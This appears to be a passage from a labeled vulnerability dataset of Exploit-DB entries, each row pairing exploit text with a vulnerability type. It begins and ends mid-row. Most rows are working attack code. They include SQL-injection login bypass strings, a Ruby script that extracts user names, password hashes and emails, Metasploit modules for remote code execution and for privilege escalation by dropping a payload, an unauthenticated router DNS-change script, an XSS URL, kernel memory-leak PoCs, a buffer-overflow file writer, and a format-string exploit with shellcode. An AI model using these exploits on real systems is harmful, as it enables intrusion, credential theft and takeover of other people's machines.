mysql_fetch_assoc(mysql_query(""SELECT * FROM admin WHERE benutzername='"".$_POST['benutzername'].""'""));                   96:                   97:	if ($check['benutzername'] == """") {                   98:                   99:		$_SESSION['login'] = false;                  100:		header(""Location: index.php?fehler=error001"");                  101:		exit;                  102:                  103:	} else {                  104:                  105:		$md5pw = md5($_POST['passwort']);                  106:                  107:		$check = mysql_fetch_assoc(mysql_query(""SELECT * FROM admin WHERE benutzername='"".$_POST['benutzername'].""' AND passwort='"".$md5pw.""'""));  [!] PoC........: To bypass the admin login:                   Username: x' or 1=1/*                  Password: not empty  [!] Solution...: upgrade to version 3.4.0  # milw0rm.com [2009-01-01]",Authentication Bypass,1
12256,"ilchClan 1.0.5B - SQL Injection ----------------------------Information------------------------------------------------ +Name :ilchClan <= 1.0.5B SQL Injection Vulnerability Exploit +Autor : Easy Laster +ICQ : 11-051-551 +email : exploit@gaza.net +Date   : 15.04.2010 +Script  : ilchClan <= 1.0.5B +Download : http://www.ilch.de/downloads-show-106.html +Price : for free +Language :PHP +Discovered by Easy Laster +Security Group 4004-Security-Project 4004-security-project.com +And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok, Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge, N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101   ---------------------------------------------------------------------------------------                                                                                         ___ ___ ___ ___                         _ _           _____           _         _   | | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_ |_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|   |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|                                                |___|                 |___|                ---------------------------------------------------------------------------------------- +Vulnerability : www.page.com/ilchClan105b/?m=downloads&cid= +Exploitable   : www.page.com/ilchClan105b/?m=downloads&cid=1+and+1=0+union+select+1, concat(name,0x3a,pass,0x3a,email)+from+ilchClan_user+where+id=1-- ----------------------------------------------------------------------------------------- #!/usr/bin/ruby #4004-security-project.com #Discovered and vulnerability by Easy Laster require 'net/http' print "" ######################################################### #                   4004-Security-Project               # ######################################################### #               ilchClan <= 1.0.5B SQL Injection        # #                          Exploit                      # #               Using Host+Path+userid+prefix           # #           www.demo.de /ilchclan/ 1 ilchClan_user      # #                         Easy Laster                   # ######################################################### "" block = ""#########################################################"" print """"+ block +"""" print ""\nEnter host name (site.com)->"" host=gets.chomp print """"+ block +"""" print ""\nEnter script path (/forum/)->"" path=gets.chomp print """"+ block +"""" print ""\nEnter script path (userid)->"" userid=gets.chomp print """"+ block +"""" print ""\nEnter script path (prefix z.b ilchClan_user)->"" prefix=gets.chomp print """"+ block +"""" begin dir = ""?m=downloads&cid=1+and+1=0+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,name,0x23,0x23,0x23,0x23,0x23)+from+""+ prefix +""+where+id=""+ userid +""--"" http = Net::HTTP.new(host, 80) resp= http.get(path+dir) print ""\nThe Username is  -> ""+(/#####(.+)#####/).match(resp.body)[1] dir = ""?m=downloads&cid=1+and+1=0+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,pass,0x23,0x23,0x23,0x23,0x23)+from+""+ prefix +""+where+id=""+ userid +""--"" http = Net::HTTP.new(host, 80) resp= http.get(path+dir) print ""\nMD5 Password Hash is -> ""+(/#####(.+)#####/).match(resp.body)[1] dir = ""?m=downloads&cid=1+and+1=0+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23)+from+""+ prefix +""+where+id=""+ userid +""--"" http = Net::HTTP.new(host, 80) resp= http.get(path+dir) print ""\nThe Email  is -> ""+(/#####(.+)#####/).match(resp.body)[1] print ""\n""+ block +"""" rescue print ""\nExploit failed"" end",SQL Injection,1
43319,"Apple macOS - 'getrusage' Stack Leak Through struct Padding /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1405  For 64-bit processes, the getrusage() syscall handler converts a `struct rusage` to a `struct user64_rusage` using `munge_user64_rusage()`, then copies the `struct user64_rusage` to userspace:  int getrusage(struct proc *p, struct getrusage_args *uap, __unused int32_t *retval) {   struct rusage *rup, rubuf;   struct user64_rusage rubuf64;   struct user32_rusage rubuf32;   size_t retsize = sizeof(rubuf);     // default: 32 bits    caddr_t retbuf = (caddr_t)&rubuf;   // default: 32 bits    struct timeval utime;   struct timeval stime;     switch (uap->who) {   case RUSAGE_SELF:     calcru(p, &utime, &stime, NULL);     proc_lock(p);     rup = &p->p_stats->p_ru;     rup->ru_utime = utime;     rup->ru_stime = stime;      rubuf = *rup;     proc_unlock(p);      break;   [...]   }   if (IS_64BIT_PROCESS(p)) {     retsize = sizeof(rubuf64);     retbuf = (caddr_t)&rubuf64;     munge_user64_rusage(&rubuf, &rubuf64);   } else {     [...]   }    return (copyout(retbuf, uap->rusage, retsize)); }  `munge_user64_rusage()` performs the conversion by copying individual fields:  __private_extern__  void  munge_user64_rusage(struct rusage *a_rusage_p, struct user64_rusage *a_user_rusage_p) {   // timeval changes size, so utime and stime need special handling    a_user_rusage_p->ru_utime.tv_sec = a_rusage_p->ru_utime.tv_sec;   a_user_rusage_p->ru_utime.tv_usec = a_rusage_p->ru_utime.tv_usec;   a_user_rusage_p->ru_stime.tv_sec = a_rusage_p->ru_stime.tv_sec;   a_user_rusage_p->ru_stime.tv_usec = a_rusage_p->ru_stime.tv_usec; [...] }  `struct user64_rusage` contains four bytes of struct padding behind each `tv_usec` element:  #define _STRUCT_USER64_TIMEVAL    struct user64_timeval _STRUCT_USER64_TIMEVAL {   user64_time_t            tv_sec;        // seconds    __int32_t                tv_usec;       // and microseconds  };  struct  user64_rusage {   struct user64_timeval ru_utime; // user time used    struct user64_timeval ru_stime; // system time used    user64_long_t ru_maxrss;    // max resident set size  [...] };  This padding is not initialized, but is copied to userspace.   The following test results come from a Macmini7,1 running macOS 10.13 (17A405), Darwin 17.0.0.   Just leaking stack data from a previous syscall seems to mostly return the upper halfes of some kernel pointers. The returned data seems to come from the previous syscall:  $ cat test.c #include <sys/resource.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <fcntl.h> #include <unistd.h>  void do_leak(void) {   static struct rusage ru;   getrusage(RUSAGE_SELF, &ru);   static unsigned int leak1, leak2;   memcpy(&leak1, ((char*)&ru)+12, 4);   memcpy(&leak1, ((char*)&ru)+28, 4);   printf(""leak1: 0x%08x\n"", leak1);   printf(""leak2: 0x%08x\n"", leak2); }  int main(void) {   do_leak();   do_leak();   do_leak();   int fd = open(""/dev/null"", O_RDONLY);   do_leak();   int dummy;   read(fd, &dummy, 4);   do_leak();   return 0; } $ gcc -o test test.c && ./test leak1: 0x00000000 leak2: 0x00000000 leak1: 0xffffff80 leak2: 0x00000000 leak1: 0xffffff80 leak2: 0x00000000 leak1: 0xffffff80 leak2: 0x00000000 leak1: 0xffffff81 leak2: 0x00000000   However, I believe that this can also be used to disclose kernel heap memory. When the stack freelists are empty, stack_alloc_internal() allocates a new kernel stack without zeroing it, so the new stack contains data from previous heap allocations. The following testcase, when run after repeatedly reading a wordlist into memory, leaks some non-pointer data that seems to come from the wordlist:  $ cat forktest.c  */  #include <sys/resource.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <fcntl.h> #include <unistd.h>  void do_leak(void) {   static struct rusage ru;   getrusage(RUSAGE_SELF, &ru);   static unsigned int leak1, leak2;   memcpy(&leak1, ((char*)&ru)+12, 4);   memcpy(&leak2, ((char*)&ru)+28, 4);   char str[1000];   if (leak1 != 0) {     sprintf(str, ""leak1: 0x%08x\n"", leak1);     write(1, str, strlen(str));   }   if (leak2 != 0) {     sprintf(str, ""leak2: 0x%08x\n"", leak2);     write(1, str, strlen(str));   } }  void leak_in_child(void) {   int res_pid, res2;   asm volatile(     ""mov $0x02000002, %%rax\n\t""     ""syscall\n\t""   : ""=a""(res_pid), ""=d""(res2)   :   : ""cc"", ""memory"", ""rcx"", ""r11""   );   //write(1, ""postfork\n"", 9);   if (res2 == 1) {     //write(1, ""child\n"", 6);     do_leak();     char dummy;     read(0, &dummy, 1);     asm volatile(       ""mov $0x02000001, %rax\n\t""       ""mov $0, %rdi\n\t""       ""syscall\n\t""     );   }   //printf(""fork=%d:%d\n"", res_pid, res2);   int wait_res;   //wait(&wait_res); }  int main(void) {   for(int i=0; i<1000; i++) {     leak_in_child();   } } /* $ gcc -o forktest forktest.c && ./forktest leak1: 0x1b3b1320 leak1: 0x00007f00 leak1: 0x65686375 leak1: 0x410a2d63 leak1: 0x8162ced5 leak1: 0x65736168 leak1: 0x0000042b  The leaked values include the strings ""uche"", ""c-\nA"" and ""hase"", which could plausibly come from the wordlist.   Apart from fixing the actual bug here, it might also make sense to zero stacks when stack_alloc_internal() grabs pages from the generic allocator with kernel_memory_allocate() (by adding KMA_ZERO or so). As far as I can tell, that codepath should only be executed very rarely under normal circumstances, and this change should at least break the trick of leaking heap contents through the stack. */",Stack Leak Through struct Padding,1
4624,"Apple Mac OSX 10.4.x Kernel - 'i386_set_ldt()' Integer Overflow (PoC) #include <stdio.h> #include <stdlib.h> #include <architecture/i386/table.h> #include <i386/user_ldt.h> #include <unistd.h> #include <sys/types.h> #include <sys/mman.h>  int main(void) {     union ldt_entry descs;     char *buf;     u_long pgsz = sysconf(_SC_PAGESIZE);      if ((buf = (char *)malloc(pgsz * 4)) == -1) {         perror(""malloc"");         exit(EXIT_FAILURE);     }      memset(buf, 0x41, pgsz * 4);      buf = (char *)(((u_long)buf & ~pgsz) + pgsz);      if (mprotect((char *)((u_long)buf + (pgsz * 2)), (size_t)pgsz,     PROT_WRITE) == -1) {         perror(""mprotect"");         exit(EXIT_FAILURE);     }      /*      * This will result in kalloc() size argument being 0x00000000 and copyin()      * size argument being 0xfffffff8.      */      if (i386_set_ldt(1024, (union ldt_entry *)&buf, -1) == -1) {         perror(""i386_set_ldt"");         exit(EXIT_FAILURE);     }      exit(EXIT_SUCCESS); }  // milw0rm.com [2007-11-16]",Integer Overflow,1
11330,"ManageEngine OpUtils 5 - 'Login.DO' SQL Injection                      ================================================================================                        ManageEngine OpUtils 5 ""Login.DO"" SQL Injection Vulnerability                      ================================================================================  #Date-3/2/10 # code by Asheesh kumar Mani Tripathi  #         AKS IT Services  # Credit by Asheesh Anaconda   #Download http://www.manageengine.com/products/oputils  #Vulnerbility  ManageEngine OpUtils 5 is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.   #Impact A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database   ========================================================================================================================                                                             Request ========================================================================================================================  POST /Login.do HTTP/1.1 Host: localhost:7080 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 115 Proxy-Connection: keep-alive Referer: http://localhost:7080/Login.do Cookie: JSESSIONID=738A4E8130CBE2A0D5E857D9EBF9820E; 32=temp; 83=temp Content-Type: application/x-www-form-urlencoded Content-Length: 136  cookieexists=true&username=asheesh&password=asheesh&logonsubmit=+&log=WARNING&locationUrl=localhost&isHttpPort=false""+and+31337-31337=""0    ========================================================================================================================                                                           Response ========================================================================================================================   HTTP/1.1 200 OK Content-Type: text/html;charset=ISO-8859-1 Date: Wed, 03 Feb 2010 15:24:08 GMT Server: Apache-Coyote/1.1 Content-Length: 20583",SQL-injection,1
31432,"Skybluecanvas CMS - Remote Code Execution (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient    def initialize(info={})     super(update_info(info,       'Name'           => 'SkyBlueCanvas CMS Remote Code Execution',       'Description'    => %q{         This module exploits an arbitrary command execution vulnerability         in SkyBlueCanvas CMS version 1.1 r248-03 and below.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Scott Parish', # Vulnerability discovery and exploit           'xistence <xistence[at]0x90.nl>' # Metasploit Module         ],       'References'     =>         [           ['CVE', '2014-1683'],           ['OSVDB', '102586'],           ['BID', '65129'],           ['EDB', '31183'],           ['URL', 'http://packetstormsecurity.com/files/124948/SkyBlueCanvas-CMS-1.1-r248-03-Command-Injection.html']         ],       'Privileged'     => false,       'Payload'        =>         {           # Arbitrary big number. The payload gets sent as an HTTP           # response body, so really it's unlimited           'Space'       => 262144, # 256k           'DisableNops' => true,           'Compat' =>             {               'ConnectionType' => 'find',               'PayloadType'    => 'cmd',               'RequiredCmd'    => 'generic perl ruby bash telnet python'             }         },       'Platform'       => %w{ unix },       'Targets'        =>         [           ['SkyBlueCanvas 1.1 r248', {}]         ],       'Arch'           => ARCH_CMD,       'DisclosureDate' => 'Jan 28 2014',       'DefaultTarget'  => 0))      register_options(       [         OptString.new('TARGETURI',[true, ""The path to the SkyBlueCanvas CMS installation"", ""/""]),       ],self.class)   end    def check     uri = normalize_uri(target_uri.path.to_s, ""index.php"")      res = send_request_raw('uri' => uri)      if res and res.body =~ /[1.1 r248]/       vprint_good(""#{peer} - SkyBlueCanvas CMS 1.1 r248-xx found"")       return Exploit::CheckCode::Appears     end      Exploit::CheckCode::Safe   end    def exploit     uri = normalize_uri(target_uri.path.to_s, ""index.php"")      send_request_cgi({       'method'  => 'POST',       'uri'     => uri,       'vars_get' => { 'pid' => '4' },       'vars_post' =>         {           'cid' => '3',           'name' => ""#{rand_text_alphanumeric(10)}\"";#{payload.encoded};"",           'email' => rand_text_alphanumeric(10),           'subject' => rand_text_alphanumeric(10),           'message' => rand_text_alphanumeric(10),           'action' => 'Send'         }     })   end end",arbitrary command execution,1
35481,Newsportal 0.37 - 'post.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/46961/info  NewsPortal is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  NewsPortal 0.37 is vulnerable; other versions may also be affected.   http://www.example.com/post.php?newsgroups=<script>alert(28)</script>,Cross-Site Scripting,1
40371,"Tenda ADSL2/2+ Modem 963281TAN - DNS Change #!/bin/bash # #   Tenda ADSL2/2+ Modem 963281TAN  #   Unauthenticated Remote DNS Change Exploit # #  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com> #  https://www.ethical-hacker.org/ #  https://www.facebook.com/ethicalhackerorg # #  Description:   #  The vulnerability exist in the web interface, which is  #  accessible without authentication.  # #  Once modified, systems use foreign DNS servers,  which are  #  usually set up by cybercriminals. Users with vulnerable  #  systems or devices who try to access certain sites are  #  instead redirected to possibly malicious sites. #   #  Modifying systems' DNS settings allows cybercriminals to  #  perform malicious activities like: # #    o  Steering unknowing users to bad sites:  #       These sites can be phishing pages that  #       spoof well-known sites in order to  #       trick users into handing out sensitive  #       information. # #    o  Replacing ads on legitimate sites:  #       Visiting certain sites can serve users  #       with infected systems a different set  #       of ads from those whose systems are  #       not infected. #    #    o  Controlling and redirecting network traffic:  #       Users of infected systems may not be granted  #       access to download important OS and software  #       updates from vendors like Microsoft and from  #       their respective security vendors. # #    o  Pushing additional malware:  #       Infected systems are more prone to other  #       malware infections (e.g., FAKEAV infection). # #  Disclaimer: #  This or previous programs is for Educational  #  purpose ONLY. Do not use it without permission.  #  The usual disclaimer applies, especially the  #  fact that Todor Donev is not liable for any  #  damages caused by direct or indirect use of the  #  information or functionality provided by these  #  programs. The author or any Internet provider  #  bears NO responsibility for content or misuse  #  of these programs or any derivatives thereof. #  By using these programs you accept the fact  #  that any damage (dataloss, system crash,  #  system compromise, etc.) caused by the use  #  of these programs is not Todor Donev's  #  responsibility. #    #  Use them at your own risk! # #    if [[ $# -gt 3 || $# -lt 2 ]]; then         echo ""               Tenda ADSL2/2+ Modem 963281TAN ""          echo ""           Unauthenticated Remote DNS Change Exploit""         echo ""  ===================================================================""         echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""         echo ""  Example: $0 133.7.133.7 8.8.8.8""         echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""         echo """"         echo ""      Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>""         echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""         exit; fi GET=`which GET 2>/dev/null` if [ $? -ne 0 ]; then         echo ""  Error : libwww-perl not found =/""         exit; fi         GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1",Remote DNS Change,1
38399,"LanSpy 2.0.0.155 - Buffer Overflow (PoC) ''' [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/AS-LANSPY-BUFFER-OVERFLOW-10052015.txt   Vendor: ================================ www.lantricks.com   Product: ================================ LanSpy.exe  LanSpy is network security and port scanner, which allows getting different information about computer: Domain and NetBios names, MAC address, Server information, Domain and Domain controller etc....   Vulnerability Type: =================== Buffer Overflow   CVE Reference: ============== N/A   Vulnerability Details: ======================  LanSpy.exe uses an 'addresses.txt' plain text file which lives under the main LanSpy directory the file is used to load scanned IPs or URLs  e.g.  127.0.0.1  replace addresses.txt file with our malicious one, the buffer overflow payload must be the very first entry in the text file. Next, run LanSpy.exe and click green arrow or use keyboard press 'F3' to start. Then KABOOM!... program crashez and we will control EIP at 684 bytes also overwrite both the NSEH & SEH exception handler pointers...  Quick stack dump...  (1274.19c4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled.  eax=0264fb41 ebx=00418d7c ecx=0264fe84 edx=00000000 esi=00000000 edi=00000000 eip=41414141 esp=0264fe8c ebp=41414141 iopl=0         nv up ei pl zr na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b efl=00010246 41414141 ??              ??? 0:001> g  (1274.19c4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00000000 ebx=00000000 ecx=52525252 edx=7714b4ad esi=00000000 edi=00000000 eip=52525252 esp=0264f8f0 ebp=0264f910 iopl=0         nv up ei pl zr na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b efl=00010246 52525252 ??              ??? 0:001> !exchain 0264f904: ntdll!LdrRemoveLoadAsDataTable+d64 (7714b4ad) 0264fe8c: 52525252 Invalid exception stack at 42424242   POC code(s): ============= '''  import os  #LanSpy.exe buffer overflow POC #by hyp3rlinx #hyp3rlinx.altervista.org #=============================  #LanSpy.exe uses an 'addresses.txt' text file #which lives under the LanSpy directory #the addresses.txt file is used to load scanned IPs or URLs  #control EIP at 684 bytes... also overwrite #both the NSEH & SEH exception handler pointers #-----------------------------------------------  payload=""A""*684+""BBBB""+""RRRR""        #<------- KABOOOOOOOOOOOOOOOOOOM!  file=open(""C:\\Program Files (x86)\\LanTricks\\LanSpy\\addresses.txt"", ""w"") file.write(payload) file.close()   ''' Public Disclosure: =================== October 5, 2015   Exploitation Technique: ======================= Local   ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx '''",Buffer Overflow,1
41708,"Lenovo System Update - Local Privilege Escalation (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Local   include Msf::Exploit::EXE   include Msf::Post::File   include Msf::Exploit::FileDropper   include Msf::Post::Windows::Priv   include Msf::Post::Windows::Services    Rank = ExcellentRanking    def initialize(info={})     super(update_info(info, {       'Name'            => 'Lenovo System Update Privilege Escalation',       'Description'     => %q{         The named pipe, \SUPipeServer, can be accessed by normal users to interact with the         System update service. The service provides the possibility to execute arbitrary         commands as SYSTEM if a valid security token is provided. This token can be generated         by calling the GetSystemInfoData function in the DLL tvsutil.dll. Please, note that the         System Update is stopped by default but can be started/stopped calling the Executable         ConfigService.exe.       },       'License'         => MSF_LICENSE,       'Author'          =>         [           'Michael Milvich', # vulnerability discovery, advisory           'Sofiane Talmat',  # vulnerability discovery, advisory           'h0ng10'           # Metasploit module         ],       'Arch'            => ARCH_X86,       'Platform'        => 'win',       'SessionTypes'    => ['meterpreter'],       'DefaultOptions'  =>         {           'EXITFUNC'    => 'thread',         },       'Targets'         =>         [           [ 'Windows', { } ]         ],       'Payload'         =>         {           'Space'       => 2048,           'DisableNops' => true         },       'References'      =>         [           ['OSVDB', '121522'],           ['CVE', '2015-2219'],           ['URL', 'http://www.ioactive.com/pdfs/Lenovo_System_Update_Multiple_Privilege_Escalations.pdf']         ],       'DisclosureDate' => 'Apr 12 2015',       'DefaultTarget'  => 0     }))      register_options([       OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)']),       OptInt.new('Sleep', [true, 'Time to sleep while service starts (seconds)', 4]),     ], self.class)    end    def check     os = sysinfo['OS']      unless os =~ /windows/i       return Exploit::CheckCode::Safe     end      svc = service_info('SUService')     if svc && svc[:display] =~ /System Update/       vprint_good(""Found service '#{svc[:display]}'"")       return Exploit::CheckCode::Detected     else       return Exploit::CheckCode::Safe     end   end     def write_named_pipe(pipe, command)     invalid_handle_value = 0xFFFFFFFF      r = session.railgun.kernel32.CreateFileA(pipe, 'GENERIC_READ | GENERIC_WRITE', 0x3, nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH | FILE_ATTRIBUTE_NORMAL', 0)     handle = r['return']      if handle == invalid_handle_value       fail_with(Failure::NoTarget, ""#{pipe} named pipe not found"")     else       vprint_good(""Opended #{pipe}! Proceeding..."")     end      begin        # First, write the string length as Int32 value       w = client.railgun.kernel32.WriteFile(handle, [command.length].pack('l'), 4, 4, nil)        if w['return'] == false         print_error('The was an error writing to pipe, check permissions')         return false       end        # Then we send the real command       w = client.railgun.kernel32.WriteFile(handle, command, command.length, 4, nil)        if w['return'] == false         print_error('The was an error writing to pipe, check permissions')         return false       end     ensure       session.railgun.kernel32.CloseHandle(handle)     end     true   end     def get_security_token(lenovo_directory)     unless client.railgun.get_dll('tvsutil')       client.railgun.add_dll('tvsutil', ""#{lenovo_directory}\\tvsutil.dll"")       client.railgun.add_function('tvsutil', 'GetSystemInfoData', 'DWORD', [['PWCHAR', 'systeminfo', 'out']], nil, 'cdecl')     end      dll_response = client.railgun.tvsutil.GetSystemInfoData(256)      dll_response['systeminfo'][0,40]   end     def config_service(lenovo_directory, option)     cmd_exec(""#{lenovo_directory}\\ConfigService.exe #{option}"")   end     def exploit     if is_system?       fail_with(Failure::NoTarget, 'Session is already elevated')     end      su_directory = service_info('SUService')[:path][1..-16]     print_status('Starting service via ConfigService.exe')     config_service(su_directory, 'start')      print_status('Giving the service some time to start...')     Rex.sleep(datastore['Sleep'])      print_status(""Getting security token..."")     token = get_security_token(su_directory)     vprint_good(""Security token is: #{token}"")      if datastore['WritableDir'].nil? || datastore['WritableDir'].empty?       temp_dir = get_env('TEMP')     else       temp_dir = datastore['WritableDir']     end      print_status(""Using #{temp_dir} to drop the payload"")      begin       cd(temp_dir)     rescue Rex::Post::Meterpreter::RequestError       fail_with(Failure::BadConfig, ""Failed to use the #{temp_dir} directory"")     end      print_status('Writing malicious exe to remote filesystem')     write_path = pwd     exe_name = ""#{rand_text_alpha(10 + rand(10))}.exe""      begin       write_file(exe_name, generate_payload_exe)       register_file_for_cleanup(""#{write_path}\\#{exe_name}"")     rescue Rex::Post::Meterpreter::RequestError       fail_with(Failure::Unknown, ""Failed to drop payload into #{temp_dir}"")     end      print_status('Sending Execute command to update service')      begin       write_res = write_named_pipe(""\\\\.\\pipe\\SUPipeServer"", ""/execute #{exe_name} /arguments /directory #{write_path} /type COMMAND /securitycode #{token}"")     rescue Rex::Post::Meterpreter::RequestError       fail_with(Failure::Unknown, 'Failed to write to pipe')     end      unless write_res       fail_with(Failure::Unknown, 'Failed to write to pipe')     end      print_status('Stopping service via ConfigService.exe')     config_service(su_directory, 'stop')   end  end",Local Privilege Escalation,1
22729,"Man 1.5.1 - Catalog File Format String // source: https://www.securityfocus.com/bid/7812/info  A vulnerability has been reported in the man utility. The problem is said to occur due to a format string bug when handling a catalog file. As a result, an attacker may be capable of writing arbitrary values to sensitive locations within process memory.  The successful exploitation of this issue could potentially result in a local attacker gaining elevated privileges, likely setgid 'man'.   /* (linux)man[v1.5l]: format string exploit. *  *                                           *  * by: v9@fakehalo.deadpig.org / fakehalo.   *  *                                           *  * man v1.5l, and below, contain a format s- *  * tring vulnerability.  the vulnerability   *  * occurs when man uses an optional catalog  *  * file, supplied by the NLSPATH/LANG envir- *  * onmental variables.                       *  *                                           *  * this exploit takes advantage of this vul- *  * nerability by making a fake catalog.  the *  * n, changing the 8th catget, which is ""Wh- *  * at manual page do you want?"", to ""8 %.0d- *  * &hn%.0d&hn"". (0=filled in correctly :))   *  *                                           *  * since the environment is the closest user *  * supplied data reached popping, the explo- *  * it works like so:                         *  *                                           *  * format bug itself: ""8 %.0d&hn%.0d&hn"",    *  * ENVVAR=<dtors+2><dtors><nops><shellcode>. *  * so, the numbers used to write the address *  * are found in the environment, making the  *  * environment needing to be well aligned.   *  *                                           *  * the bug itself is located here:           *  * gripes.c:89:vfprintf(stderr,getmsg(n),p); *  * (getmsg() returns data from the catalog)  *  *                                           *  * successful exploitation will look like:   *  * 000...000000000000000001074078752sh-2.04# *  *                                           *  * note: recent glibc versions unsetenv()    *  * NLSPATH, along with other environmental   *  * variables, when running set*id programs.  *  * so, this exploit is limited in that rega- *  * rd.  this is just a proof of concept any- *  * ways.                                     *  *********************************************/  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/stat.h> #include <sys/types.h> #include <pwd.h>  #define PATH ""/usr/bin/man"" /* man binary. */ #define NOP_AMT 4096 /* number of NOPs.    */ #define LANG_NAME ""xx"" /* ""en"", ""fr"", ...  */  static char x86_exec[]= /* with setgid(15); */  ""\xeb\x29\x5e\x31\xc0\xb0\x2e\x31\xdb\xb3""  ""\x0f\xcd\x80\x89\x76\x08\x31\xc0\x88\x46""  ""\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e""  ""\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8""  ""\x40\xcd\x80\xe8\xd2\xff\xff\xff\x2f\x62""  ""\x69\x6e\x2f\x73\x68\x01"";  struct platform {  unsigned short align;  unsigned int pops;  unsigned long dtors_addr;  unsigned long ret_addr;  char *exec; };  struct platform target[2] = {  {   /* alignment.                        */   0,   /* pops, example provided below.     */   88,   /* objdump -sj.dtors /usr/bin/man    */   (0x805122c+4),   /* generalized number, room to work. */   0xbffffe01,   /* shellcode, with setgid(15)        */   x86_exec  },  { 0, 0, 0, 0, NULL } };  char *setfmt(unsigned int); char *setfmtmem(unsigned int); char *setlang(unsigned int); void printe(char *);  int main(int argc,char **argv){  extern char **environ;   if(argc<2){   printf(""(*)man[v1.5l]: format string exploit.\n""   ""(*)by: v9@fakehalo.deadpig.org / fakehalo.\n\n""   ""syntax: %s <platform>\n""   "" 0 : Compiled RH/linux 2.4.2-2.\n"",argv[0]);   exit(1);  }  if(atoi(argv[1])>0)   printe(""main(): invalid platform number"");   /* reset environment to ensure addresses   */  /* are aligned.  as the pointer used is    */  /* going to be aligned in the environment. */  bzero((void *)&environ,sizeof(environ));  if(!(environ=(char **)malloc(3*(sizeof(char *)))))   printe(""main(): allocation of memory error"");   /* X<alignment>=<addr+2><addr><nops><shellcode> */  environ[0]=setfmtmem(atoi(argv[1]));   /* NLSPATH=/path/to/lang. */  environ[1]=setlang(atoi(argv[1]));  environ[2]=0x0;   if(execlp(PATH,PATH,0))   printe(""main(): failed to execute man"");   exit(0); } /* makes buffer: ""8 %0d$hn%0d$hn"" */ char *setfmt(unsigned int pf){  unsigned int addrl,addrh;  unsigned int pops=target[pf].pops;  unsigned long addr=target[pf].ret_addr;  char *buf;   addrh=(addr&0xffff0000)>>16;  addrl=(addr&0x0000ffff);   if(!(buf=(char *)malloc(64+1)))   printe(""setfmt(): allocating memory failed"");  bzero(buf,(64+1));   if(addrh<addrl)   sprintf(buf,""8 %%.%dd%%%d$hn%%.%dd%%%d$hn"",   (addrh-1),pops,(addrl-addrh),(pops+1));  else   sprintf(buf,""8 %%.%dd%%%d$hn%%.%dd%%%d$hn"",   (addrl-1),(pops+1),(addrh-addrl),pops);  /* example of how to find amount of pops.  */ /* run the exploit with this return(),     */ /* adding ""%x""'s, until you see your data. */ /* return(""8 ""  ""%x %x %x %x %x %x %x %x %x %x"" // 10  ""%x %x %x %x %x %x %x %x %x %x"" // 20  ""%x %x %x %x %x %x %x %x %x %x"" // 30  ""%x %x %x %x %x %x %x %x %x %x"" // 40  ""%x %x %x %x %x %x %x %x %x %x"" // 50  ""%x %x %x %x %x %x %x %x %x %x"" // 60  ""%x %x %x %x %x %x %x %x %x %x"" // 70  ""%x %x %x %x %x %x %x %x %x %x"" // 80  ""%x %x %x %x %x %x %x %x"" // 8+80=88. (my box)  ""\n""); */   return(buf); } /* makes buffer: <addr+2><addr><nops><shellcode> */ char *setfmtmem(unsigned int pf){  unsigned short align=target[pf].align; 